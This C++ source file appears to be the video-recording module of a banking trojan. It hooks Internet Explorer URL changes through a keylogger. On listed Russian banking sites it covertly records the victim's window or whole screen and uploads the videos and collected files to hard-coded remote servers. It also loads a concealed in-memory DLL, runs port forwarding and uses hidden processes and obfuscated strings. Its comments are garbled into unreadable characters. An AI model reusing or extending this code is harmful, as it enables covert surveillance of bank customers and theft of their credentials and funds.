

#include "VideoRecorder.h"
#include "BotCore.h"
#include "Memory.h"
#include "Utils.h"
#include "GetApi.h"
#include "Config.h"
#include "Crypt.h"
#include "Pipes.h"
#include "Inject.h"
#include "StrConsts.h"


//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace VIDEORECDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define VDRDBG VIDEORECDEBUGSTRINGS::DBGOutMessage<>

//----------------------------------------------------------------------------


/// ������ ������������� �������. � ������ ������� ����� ������ �������������
//  ������� ����
#ifndef DEBUGCONFIG
	char VIDEO_REC_URLS[VIDEOREC_PARAM_SIZE_URLS] = VIDEOREC_PARAM_NAME_URLS;
#else
	char VIDEO_REC_URLS[VIDEOREC_PARAM_SIZE_URLS] = "*bsi.dll*\0"
												  "*ibank.alfabank.ru*\0"
												  "*avangard.ru*\0\0";
#endif


#define HASH_VIDEO_REC_URLS 0x9189212B /* VIDEO_REC_URLS */


#ifdef DEBUGCONFIG
//	char VIDEO_REC_HOST1[] = "178.162.179.65";
//	char VIDEO_REC_HOST2[] = "188.72.202.163";

//	char VIDEO_REC_HOST1[] = "127.0.0.1";
//	char VIDEO_REC_HOST2[] = "127.0.0.1";
	char VIDEO_REC_HOST1[] = "192.168.0.100";
	char VIDEO_REC_HOST2[] = "192.168.0.100";
//	char VIDEO_REC_HOST1[] = "192.168.147.2";
//	char VIDEO_REC_HOST2[] = "193.106.161.242";
#else
	//����� ������� ���� ����� �����
	char VIDEO_REC_HOST1[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST1;
	char VIDEO_REC_HOST2[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST2;
#endif


#define HASH_VIDEO_REC_HOST 0x922E6EAC /* VIDEO_REC_HOST */


namespace VideoRecorder
{
	// ���������� ��� ����������
	#include "VideoRecorderDll.cpp"
}


//*****************************************************************************
//                                    TVideoRecDLL
//*****************************************************************************
TVideoRecDLL::TVideoRecDLL()
	: TMemoryDLL(VideoRecorder::data)
{
	// ��������� ���������� � �������������� ���
	InitializeApi();
}
//-------------------------------------------------------------------

TVideoRecDLL::~TVideoRecDLL()
{

}
//-------------------------------------------------------------------

void TVideoRecDLL::LoadFunc(const char* Name, LPVOID &Addr)
{
	// ������� ��������� ������� ����������
	// ������� ����������� �� ��, ��� ������ Name �����������
	Addr = GetProcAddress(GetStr(Name));
}
//-------------------------------------------------------------------

void TVideoRecDLL::InitializeApi()
{
	LoadFunc(VideRecFuncRecordProcess,  (LPVOID&)RecordProcess);
	LoadFunc(VideRecFuncRecordWnd,      (LPVOID&)RecordWnd);
	LoadFunc(VideRecFuncStop,           (LPVOID&)Stop);
	LoadFunc(VideRecFuncResetTimer,     (LPVOID&)ResetTimer);
	LoadFunc(VideRecFuncSendData,       (LPVOID&)SendData);
	LoadFunc(VideRecFuncRunPortForward, (LPVOID&)RunPortForward);
	LoadFunc(VideRecFuncInitSendLog,	(LPVOID&)InitSendLog);
	LoadFunc(VideRecFuncReleaseSendLog,	(LPVOID&)ReleaseSendLog);
	LoadFunc(VideRecFuncSendLog,		(LPVOID&)SendLog);
}



//*****************************************************************************
//                                    TVideoRecDLL
//*****************************************************************************
TVideoRecorder::TVideoRecorder()
{
	UID        = Bot->UID();
	Server     = VIDEO_REC_HOST1;
	Server2    = VIDEO_REC_HOST2;
	Port       = VIDEORECORD_DEFAULT_PORT;
	Port2      = VIDEORECORD_DEFAULT_PORT;
    RecordTime = 0;
}
//--------------------------------------------------------------

TVideoRecorder::~TVideoRecorder()
{

}
//--------------------------------------------------------------

void TVideoRecorder::RecordProcess(DWORD PID)
{
	// ������� ��������� ������ ����� � ���������� ��������
	if (FDLL.RecordProcess)
	{
		if (!PID) PID = Bot->PID();

		FDLL.RecordProcess(UID.t_str(), VideoName.t_str(), PID,
						   Server.t_str(), Port,
						   Server2.t_str(), Port2, RecordTime, 0);
    }
}
//--------------------------------------------------------------

void TVideoRecorder::RecordCurrentProcess()
{
	// ������� ��������� ������ ����� � �������� ��������
	RecordProcess(0);
}
//--------------------------------------------------------------

void TVideoRecorder::RecordWnd(HWND Wnd)
{
	// ������� ��������� ������ ����� � ���������� ����
	if (FDLL.RecordWnd)
	{
		int Flags = 0;
		if (!Wnd)
		{
			// ����������� ������������� ������
			Flags = VIDEO_FULLSCREEN | VIDEO_ALWAYS;
		}
		VDRDBG("VideoRecorder", "�������� ������ � ���� %d", Wnd);
		FDLL.RecordWnd(UID.t_str(), VideoName.t_str(), Wnd,
					   Server.t_str(), Port,
					   Server2.t_str(), Port2, RecordTime, Flags);
    }
}
//--------------------------------------------------------------

void TVideoRecorder::RecordScreen()
{
	RecordWnd(NULL);
}
//--------------------------------------------------------------

void TVideoRecorder::ResetTimer()
{
	// ������� �������� ����� ������
	if (FDLL.ResetTimer) FDLL.ResetTimer();
}
//--------------------------------------------------------------

void TVideoRecorder::SendFiles(const char *Path)
{
	// ������� ���������� �� ������ ����� �� ���������� ����
	if (FDLL.SendData && !STRA::IsEmpty(Path))
	{
		FDLL.SendData(UID.t_str(), (char*)Path, Server.t_str(), Port,
										        Server2.t_str(), Port2);
    }

}
//--------------------------------------------------------------

void TVideoRecorder::Stop()
{
	// ������� ������������� ������
	if (FDLL.Stop) FDLL.Stop();
}
//--------------------------------------------------------------


//*********************************************************************************
//							VideoSendLog
//*********************************************************************************
VideoSendLog::VideoSendLog()
{
	dll.InitSendLog( Bot->UID().t_str(), VIDEO_REC_HOST1, VIDEORECORD_DEFAULT_PORT, VIDEO_REC_HOST2, VIDEORECORD_DEFAULT_PORT );
}

VideoSendLog::~VideoSendLog()
{
	dll.ReleaseSendLog();
}

//�������� ���� �� ������:
//name - ��� ����
//code - ��� ����
//format - ��������������� ����� ����
void VideoSendLog::Send( const char* name, int code, const char* format, ... )
{
	if( format != 0 )
	{
		va_list va;
		va_start( va, format );
		SendV( name, code, format, va );
		va_end(va);
	}
	else
		Send2( name, code, format );
}

void VideoSendLog::SendV( const char* name, int code, const char* format, va_list va )
{
	char buf[1024];
	pwvsprintfA( buf, format, va );
	Send2( name, code, buf );
}

void VideoSendLogName::Send( int code, const char* format, ... )
{
	va_list va;
	va_start( va, format );
	vsl.SendV( name, code, format, va );
	va_end(va);
}


//*****************************************
//  ���������� ������ ������ ��������������
//*****************************************
TVideoRecorder* VideoRecorderObj = NULL;
DWORD           VideoRecorderPID = 0;



//*****************************************
//  ������� ���������� ��������� ��
//  ���������� ����� ��������������
//*****************************************
TVideoRecorder* GetVideoRecorder(bool CreateIfNotExists = true)
{
	if (IsNewProcess(VideoRecorderPID))
		VideoRecorderObj = NULL;

	if (!VideoRecorderObj && CreateIfNotExists)
		VideoRecorderObj = new TVideoRecorder();

	return VideoRecorderObj;
}
//----------------------------------------------------------------


//------------------------------------------------------------
// RecordProcess - ������� ��������� ����������� �����������
// ���������� ��������.
//
// PID - ������������� ���������� ��������. ���� 0, �� �����
//       ������� ������ �������� ��������
//
// VideoName - ��� �����������
//------------------------------------------------------------
void VideoRecorder::RecordProcess(DWORD PID, const char* VideoName)
{
	TVideoRecorder* Recorder = GetVideoRecorder();
	if (Recorder)
	{
		Recorder->VideoName = VideoName;
        Recorder->RecordProcess(PID);
    }
}
//-------------------------------------------------------------------------



//------------------------------------------------------------
// RecordWnd - ������� ��������� ������������ ������ ����� �
// ���������� ����
//
// Wnd - ������������� ����
// VideoName - ��� ������
//------------------------------------------------------------
void VideoRecorder::RecordWnd(HWND Wnd, const char* VideoName)
{
	TVideoRecorder* Recorder = GetVideoRecorder();
	if (Recorder)
	{
		Recorder->VideoName = VideoName;
        Recorder->RecordWnd(Wnd);
    }
}
//------------------------------------------------------------



//------------------------------------------------------------
//  VideoRecorderSendFiles - ������� ���������� ����� ��
//  ��������� ����� �� ������ �����������.
//  ��������� ������� ����������.
//------------------------------------------------------------
void VideoRecorder::SendFiles(PCHAR Path)
{
	if (!STRA::IsEmpty(Path))
	{
		TVideoRecorder Recorder;
		Recorder.SendFiles(Path);
    }
}


void VideoRecorder::SendFiles(string const &Path)
{
	SendFiles(Path.t_str());
}

//-------------------------------------------------------------------------


//------------------------------------------------------------
//  ������� ������������� ������
//------------------------------------------------------------
void VideoRecorder::Stop()
{
	TVideoRecorder* Recorder = GetVideoRecorder(false);
	if (Recorder)
		Recorder->Stop();
}
//-------------------------------------------------------------------------


DWORD WINAPI StartSendinThread(LPVOID Data)
{
	//�� ������ ���� ���� ��������� � ��������� ������

	//??????????????????????????????????????????????????????
	PCHAR Path_Folder;
	if (Data!=NULL)
	{
		Path_Folder = (PCHAR)Data;
	}
	else
	{
		// ������������ ������ ��� ����������
		Path_Folder = STR::Alloc(MAX_PATH );
		m_memset(Path_Folder,0,MAX_PATH);
		pExpandEnvironmentStringsA( ("%AllUsersProfile%\\cdat"), Path_Folder, MAX_PATH);
	}

	VDRDBG("VIDEO","���������� ��� %s",Path_Folder);
	VideoRecorder::SendFiles(Path_Folder);
	return 0;

}
//---------------------------------------------------------------------------------




void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
{
	// ��������� ����� � �������� �, � ������ �������, ��������� ������
	if (CalcHash(VIDEO_REC_URLS) == HASH_VIDEO_REC_URLS)
		return;

	PCHAR URL = NULL;

	if (!STR::IsEmpty((PCHAR)Data))
	{
		PCHAR Temp = VIDEO_REC_URLS;
		while (*Temp != 0)
		{
			if (CompareUrl(Temp, (PCHAR)Data))
			{
				URL = Temp;
				break;
			}

			//--------------------
			Temp = STR::End(Temp); // ��������� � ����� ������
			Temp++;                // ���������� ������� ������
		}
    }


	if (URL != NULL)
	{
		VideoRecorderSrv::StartRecording(URL);
//		VideoRecorderSrv::StartInfiniteRecording(URL);
	}
	else
	{
		VideoRecorderSrv::StopRecording();
	}
}


void StartVideoFromCurrentURL()
{
	#ifdef UniversalKeyLoggerH
 		VDRDBG("VideoRecorder", "�������������� ������������� ��� ������ ��� ������ �������");

		KeyLogger::Initialize(NULL);
		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
		KeyLogger::Start();
	#endif
}

PCHAR GetVideoRecHost1()
{
	//������� ���������� ����� ������� ��� ������ �����
	if (CalcHash(VIDEO_REC_HOST1) == HASH_VIDEO_REC_HOST)
		return NULL;

	return VIDEO_REC_HOST1;
}

PCHAR GetVideoRecHost2()
{
	//������� ���������� ����� ������� ��� ������ �����
	if (CalcHash(VIDEO_REC_HOST2) == HASH_VIDEO_REC_HOST)
		return NULL;

	return VIDEO_REC_HOST2;
}


//*********************************************************************
//  ������ ������� ������������� ������ �����
//*********************************************************************

namespace VideoRecorderSrv
{
	char ServerName[] = {'v','i','d','e','o','r','e','c','s','r','v', 0};

	char CommandStart[] = {'s','t','a','r','t','v','r', 0};
	char CommandStartInfinite[] = {'s','t','a','r','t','v','r', 'i', 'n', 'f', 0};
	char CommandStop[]  = {'s','t','o','p','v','r', 0};

	char ClientPipe[] = {'V','d','e','o','R','e','c','C','l','i','e','n','t', 0};

    char InfiniteRecorderPipe[] = "infvdrec";

	//----------------------------------------------------------------------
	// ���������� ������
    //----------------------------------------------------------------------

	// ��� �������� ������� ��������� ������� ��� ������
	const static BYTE ClientURLMaxSize = 255;
	DWORD ClientPID = 0;
	char  ClientURL[ClientURLMaxSize + 1];

	// ������� ������������� �������� ������ �����
	bool ClientTerminated = false;
	HANDLE ClientThread = 0;

    //----------------------------------------------------------------------

	PCHAR GetClientPipeName(DWORD PID)
	{
		// ������� ���������� ��� ������ ������� �������
		PCHAR PIDStr = StrLongToString(PID);

		PCHAR Name = STR::New(2, ClientPipe, PIDStr);

		STR::Free(PIDStr);
		return Name;
    }
	//----------------------------------------------------------------------


	DWORD WINAPI RecordThread(LPVOID Data)
	{
		// ����� ������ �����

		// ��������������  ����������
		TVideoRecorder Recorder;

		VDRDBG("VideoRecorder", "������� ����� ������ ����� � �������� %d URL %s", ClientPID, ClientURL);
		Recorder.RecordProcess(ClientPID);

		// ������� ��������� ������
		while (!ClientTerminated)
		{
			pSleep(1000);
			if (!IsProcessLeave(ClientPID))
            	break;
		}

		Recorder.Stop();

		VDRDBG("VideoRecorder", "����� ������ ����� ����������");
		return 0;
	}

/*
	DWORD WINAPI RecordThread(LPVOID Data)
	{
		// ����� ������ �����

		// ��������������  ����������
		HMEMORYMODULE Module = VideoRecorder::LoadDLL();
		if (Module == NULL)
			return 0;

		TStartRecPid   Start = (TStartRecPid)MemoryGetProcAddress(Module,
											 VideoRecorder::MethodStartRecordPid);

		TStopRec       Stop  = (TStopRec)MemoryGetProcAddress(Module,
											 VideoRecorder::MethodStop);

		if (Start == NULL || Stop == NULL)
		{
			// �� ������� ���������������� ����������
			VDRDBG("VideoRecorder", "DLL �� �������� ����������� �������");
			MemoryFreeLibrary(Module);
            return 0;
        }

		// �������������� ��������� �������
		PCHAR IP1 = GetVideoRecHost1();
		PCHAR IP2 = GetVideoRecHost2();
		int Port  = VIDEORECORD_DEFAULT_PORT;
		PCHAR UID = GenerateBotID();

		// ��������� ������
		VDRDBG("VideoRecorder", "������� ����� ������ ����� � �������� %d URL %s", ClientPID, ClientURL);
		Start(UID, ClientURL, ClientPID, IP1, Port, IP2, Port, 0, 0);

		// ������� ��������� ������
		while (!ClientTerminated)
		{
			pSleep(1000);
			if (!IsProcessLeave(ClientPID))
            	break;
		}

		Stop();

		VDRDBG("VideoRecorder", "����� ������ ����� ����������");

		MemoryFreeLibrary(Module);

		STR::Free(UID);

		return 0;
	}
   */
	//----------------------------------------------------------------------

	void WINAPI ClientStopHandler(LPVOID, PPipeMessage Pipe, bool &Cancel)
	{
    	// ���������� ������� ��������� �����
		VDRDBG("VideoRecorder", "�������� ������� ����������� ������");
        ClientTerminated = true;
	}
	//----------------------------------------------------------------------

	DWORD WINAPI ClientMainProc(LPVOID Data)
	{
		// �������� ��������� ������� ������ �����
		BOT::Initialize(ProcessUnknown);

		VDRDBG("VideoRecorder", "������� ������ ������ �����. PID %d", ClientPID);


		ClientThread = NULL;
		ClientTerminated = false;


		// ������ ����� ����� ������

		PCHAR PipeName = GetClientPipeName(ClientPID);

		PProcessPipe Pipe = PIPE::CreateProcessPipe(PipeName, false);

		STR::Free(PipeName);

		if (Pipe == NULL)
		{
        	VDRDBG("VideoRecClient", "ClientPipe error");
			return 0;
		}

//		PIPE::RegisterMessageHandler(Pipe, ClientStartHandler, NULL, CommandStart, 0);
		PIPE::RegisterMessageHandler(Pipe, ClientStopHandler, NULL, CommandStop, 0);

		PIPE::StartProcessPipe(Pipe);


		ClientThread = StartThread(RecordThread, NULL);

		// ������� ��������� ������
		pWaitForSingleObject(ClientThread, INFINITE);

		VDRDBG("VideoRecorder", "������ �������� ������");
		pExitProcess(0);
		return 0;
	}
	//----------------------------------------------------------------------

	void SetClientParams(DWORD PID, PCHAR Name)
	{
		// ������� �������������� ��������� ������ �������
		ClientPID = PID;
		m_memset(ClientURL, 0, ClientURLMaxSize + 1);
		DWORD  Len = STRA::Length(Name);
		if (Len)
		{
			DWORD CopySize = Min(ClientURLMaxSize, Len);
			m_memcpy(ClientURL, Name, CopySize);
		}
    }

    //----------------------------------------------------------------------

	void WINAPI ServerStartHandler(LPVOID, PPipeMessage Msg, bool &Cancel)
	{
		// ���������� ������� ������� �����

		// ����������� ��������� ������

        VDRDBG("VideoRecServer", "�������� ������� ������ ����� � �������� %d", ClientPID);

		PCHAR PipeName = GetClientPipeName(ClientPID);

		// ��������� ������������� ������������� ��������
		BOOL Running = PIPE::Ping(PipeName);

		// � ������ ���� ������� �� �������� ��������� ���
		if (!Running)
		{
			SetClientParams(Msg->PID, Msg->Data);

//			 StartThread(ClientMainProc, NULL);
			MegaJump(ClientMainProc);

			// ������� ������� � ������������� ��������
			DWORD St = (DWORD)pGetTickCount();
			while (!Running)
			{
				pSleep(250);
				Running = PIPE::Ping(PipeName);

				// ������������ ����� ��������
				if (((DWORD)pGetTickCount() - St) >= 2000) break;
			}
		}

		STR::Free(PipeName);
	}
	//----------------------------------------------------------

	string GetInfiniteRecordFile()
	{
		// ������� ���������� ��� ����������� ����� ����������� ������
		string Name = Bot->WorkPath() + "infvrc.dat";
		return Name;
	}
	//----------------------------------------------------------



	DWORD WINAPI InfiniteRecordingProc(LPVOID)
	{
		// ������� ����������� ������ �����
		BOT::Initialize(ProcessUnknown);

        VDRDBG("VideoRecorder", "��������� ������������� ����������� ������ �����");

        // ������ ���� ��� �������� ������
		PProcessPipe Pipe = PIPE::CreateProcessPipe(InfiniteRecorderPipe, true);

		TVideoRecorder Recorder;

		DWORD MaxRecordTime = 12*60*60*1000;
		DWORD SleepInterval = 5*60*1000;
//		DWORD MaxRecordTime = 60*1000;    // ��� ������
//		DWORD SleepInterval = 10*1000;

		// ������ � ������ ���� ��������
		string FileName = GetInfiniteRecordFile();

		while (1)
		{
			// ������ ��� ������ �� �����
			TBotFileStream *FileStream = new TBotFileStream(FileName.t_str(), fcmRead);

			if (!FileStream->Valid())
			{
				// �� ������� ������� ����, ������ �����
				delete FileStream;
				pSleep(1000);
				continue;
			}

			// ��������� ������������ �������� ������
			DWORD  WriteTime = File::LastWriteTime(FileStream->Handle());
			if (WriteTime > MaxRecordTime)
			{
				// ��������� ����� ������. ��������� �������
				Recorder.Stop();
				break;
            }

			//  ��������� ��������� ��������
			string Name = FileStream->ReadToString();

			if (Name.IsEmpty())
				Name = "FullScr";

			if (Recorder.VideoName != Name)
			{
				// ��������� ��� ������, ���� ������ ��� �� ��������
				Recorder.VideoName = Name;

                // �������� ������
				Recorder.RecordWnd(0);
            }

            delete FileStream;
			pSleep(SleepInterval);
		}

		// ������ ���������, ������� ���������� ����
		while (!pDeleteFileA(FileName.t_str()))
			pSleep(100);

		  // ����������� � ���������� ��������� �����
//        PIPE::FreeProcessPipe(Pipe);
		return 0;
	}
    //----------------------------------------------------------

	bool IsInfiniteRecording()
	{
		// ������� ��������� ������ ���� � ������� ������������ ����������
		// ���� ����������� ������
		return FileExistsA(GetInfiniteRecordFile().t_str());
	}
	//----------------------------------------------------------

	void StartInfiniteRecord(PCHAR Name, bool UpdateFile)
	{
		// ������� ��������� ����������� ������ ����� ����� ������

		// ������ ���������� ����
		string FileName = GetInfiniteRecordFile();

		// ��� �������������, ������ ����
		if (!FileExistsA(FileName.t_str()) || UpdateFile)
		{
			DWORD Len = STRA::Length(Name);
			// ��� ������ ���������, ��� ���� ����� ���� �����
			if (Len)
				File::WriteBufferA(FileName.t_str(), Name, Len);
        }

		// ��������� ������
		if (!PIPE::Ping(InfiniteRecorderPipe))
		{
			SetClientParams(0, Name);
//			StartThread(InfiniteRecordingProc, NULL); // ��� ������
			MegaJump(InfiniteRecordingProc);
		}
	}
	//----------------------------------------------------------

	void WINAPI ServerStartInfiniteHandler(LPVOID, PPipeMessage Msg, bool&)
	{
		//  ���������� ������� ����������� ������ �����
		StartInfiniteRecord(Msg->Data, true);
	}
}
//-----------------------------------------------------------------------------

bool VideoRecorderSrv::Start()
{
	// ��������� ������
	VDRDBG("VideoRecorder", "��������� ������ ������������� ������ �����");
	PProcessPipe Pipe = PIPE::CreateProcessPipe(ServerName, true);
	if (Pipe == NULL)
		return false;

	// ��� ������������� ��������� ����������� ������
	string FileName = GetInfiniteRecordFile();
	if (FileExistsA(FileName.t_str()))
	{
		TBotFileStream File(FileName.t_str(), fcmRead);
		string Name = File.ReadToString();

		StartInfiniteRecord(Name.t_str(), false);
	}

	// ��������� ����������� ������
	PIPE::RegisterMessageHandler(Pipe, ServerStartHandler, NULL, CommandStart, 0);
	PIPE::RegisterMessageHandler(Pipe, ServerStartInfiniteHandler, NULL, CommandStartInfinite, 0);

	return true;
}
//-----------------------------------------------------------------------------

bool VideoRecorderSrv::StartRecording(PCHAR URL)
{
	// ������� �������� ������ ������
	// ����� ��� �������� ��������

	// ��������� ������������� ������������� ��������

	if (PingClient(0))
		return true;

	VDRDBG("VideoRecorder", "���������� ������� ������� �������� ������ �����");

	bool Result = PIPE::SendMessage(ServerName, CommandStart, URL, 0, NULL);
	if (!Result)
	{
		VDRDBG("VideoRecorder", "������ ������� �������� ������. �������� ������ �� ��������.");
	}

	return Result;
}
//-----------------------------------------------------------------------------

//-----------------------------------------------------
//  StartInfiniteRecording - ������� ���������
//  ����������� ������ � ������������� ������
//-----------------------------------------------------
bool VideoRecorderSrv::StartInfiniteRecording(const char* VideoName)
{
	VDRDBG("VideoRecorder", "���������� ������� ����������� ������ �����");

	bool Result = PIPE::SendMessage(ServerName, CommandStartInfinite, (PCHAR)VideoName, 0, NULL);

	if (!Result)
	{
		VDRDBG("VideoRecorder", "������ ������� �������� ������. �������� ������ �� ��������.");
	}

	return Result;
}
//-----------------------------------------------------------------------------

bool VideoRecorderSrv::StopRecording()
{
	// ������� ������������� ������ ������
	// ����� ��� �������� ��������

	DWORD PID = GetUniquePID();
	PCHAR PipeName = GetClientPipeName(PID);

	bool Result = PIPE::SendMessage(PipeName, CommandStop);
	if (Result)
	{
    	VDRDBG("VideoRecorder", "������ ����� � �������� %d �����������", PID);
    }

	STR::Free(PipeName);

	return Result;
}
//-----------------------------------------------------------------------------

//-----------------------------------------------------
//  PingClient - ������� ��������� �������� ��
//               ������ ������ � ��������� PID
//	���� PID ����� 0 �� ����� ����������� �������
//  �������
//-----------------------------------------------------
bool VideoRecorderSrv::PingClient(DWORD PID)
{
	//  ������� ��������� �������� �� ������ ������ � ��������� PID
	if (PID == 0)
		PID = GetUniquePID();

	PCHAR PipeName = GetClientPipeName(PID);

	DWORD Result = PIPE::Ping(PipeName);

	STR::Free(PipeName);

	return Result != 0;
}
//-----------------------------------------------------------------------------

TVideoRecDLL* RunPortForward( const char* ip )
{
	if( ip && ip[0] ) //������ ����
	{
		TVideoRecDLL* videoDll = new TVideoRecDLL(); //������������� ���� ���
		if( videoDll )
		{
			if( videoDll->RunPortForward )
			{
				videoDll->RunPortForward( BOT_UID, ip, VIDEORECORD_DEFAULT_PORT );
				return videoDll;
			}
		}
		delete videoDll;
	}
	return 0;
}

bool SaveVideoDll( const char* nameFile )
{
	void* dataDll;
	DWORD sizeDll;
	bool neededDel;
	if( TMemoryDLL::DecodeDll( VideoRecorder::data, sizeDll, dataDll, neededDel ) )
	{
		bool res = File::WriteBufferA( (char*)nameFile, dataDll, sizeDll ) > 0;
		if( neededDel ) MemFree(dataDll);
		return res;
	}
	return false;
}
